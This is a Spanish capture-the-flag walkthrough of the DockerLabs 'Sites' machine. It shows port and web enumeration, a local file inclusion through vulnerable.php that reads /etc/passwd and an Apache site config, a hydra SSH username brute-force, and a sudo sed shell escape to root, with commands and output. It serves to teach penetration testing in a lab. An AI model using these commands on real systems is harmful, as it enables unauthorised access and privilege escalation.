#MAQUINA #DOCKERLABS #MEDIO 
#LFI
<hr>

# RECONOCIMIENTO

Vamos a resolver **Sites** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 09:09 CET
Initiating ARP Ping Scan at 09:09
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 09:09, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:09
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 09:09, 0.52s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-27 09:09:33 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 09:09 CET
Nmap scan report for chat.chatme.dl (172.17.0.2)
Host is up (0.000018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 cb:8f:50:db:6d:d8:d4:ac:bf:54:b0:62:12:7c:f0:01 (ECDSA)
|_  256 ca:6b:c7:0c:2a:d6:0e:3e:ff:c4:6e:61:ac:35:db:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Configuraci\xC3\xB3n de Apache y Seguridad en Sitios Web
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 09:10 CET
Nmap scan report for chat.chatme.dl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Usamos **gobuster** :

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt,png,jpg,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 3591]
/.php                 (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/vulnerable.php       (Status: 200) [Size: 37]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================



```

Tenemos el **vulnerable.php**.

Usamos wfuzz :
```bash
wfuzz -u "http://172.17.0.2/vulnerable.php?FUZZ=/etc/hosts" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hw=7
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/vulnerable.php?FUZZ=/etc/hosts
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000099:   200        8 L      16 W       175 Ch      "page"                                                                                                                   
000000125:   200        1 L      2 W        18 Ch       "user" 
```

Tenemos un **LFI**.

Apuntamos a `/etc/passwd` -> usuario : **chocolate**

En el index, nos habla de un sites-available. Se encuentra en `/etc/apache2/sites-available` y nos habla de un sitio.conf :

```bash

http://172.17.0.2/vulnerable.php?page=/etc/apache2/sites-available/sitio.conf

<VirtualHost *:80>
    ServerAdmin webmaster@tusitio.com
    DocumentRoot /var/www/html
    ServerName sitio.dl
    ServerAlias www.sitio.dl

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    # Bloquear acceso al archivo archivitotraviesito (cuidadito cuidadin con este regalin)
    # <Files "archivitotraviesito">
    #   Require all denied
    # </Files>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

Nos habla de un archivo `archivitotraviesito` :

```bash

Muy buen, has entendido el funcionamiento de un LFI y los archivos interesantes a visualizar dentro de apache, ahora te proporciono el acceso por SSH, pero solo la password, para practicar un poco de bruteforce (para variar)

lapasswordmasmolonadelacity

```
# EXPLOTACION

Usamos **hydra** :

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p lapasswordmasmolonadelacity  ssh://172.17.0.2 -t 64 -F
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-27 09:31:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 8295455 login tries (l:8295455/p:1), ~129617 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 489.00 tries/min, 489 tries in 00:01h, 8295012 to do in 282:44h, 18 active
[22][ssh] host: 172.17.0.2   login: chocolate   password: lapasswordmasmolonadelacity
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-27 09:32:49
```

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:

   ```bash
chocolate@ae2bd99b618e:~$ sudo -l
Matching Defaults entries for chocolate on ae2bd99b618e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User chocolate may run the following commands on ae2bd99b618e:
    (ALL) NOPASSWD: /usr/bin/sed


```

Vemos **sed** con permisos SUDO:

```bash

chocolate@ae2bd99b618e:~$ sudo sed -n '1e exec sh 1>&0' /etc/hosts
# whoami
root
# 

```

**YA ESTAMOS COMO ROOT.**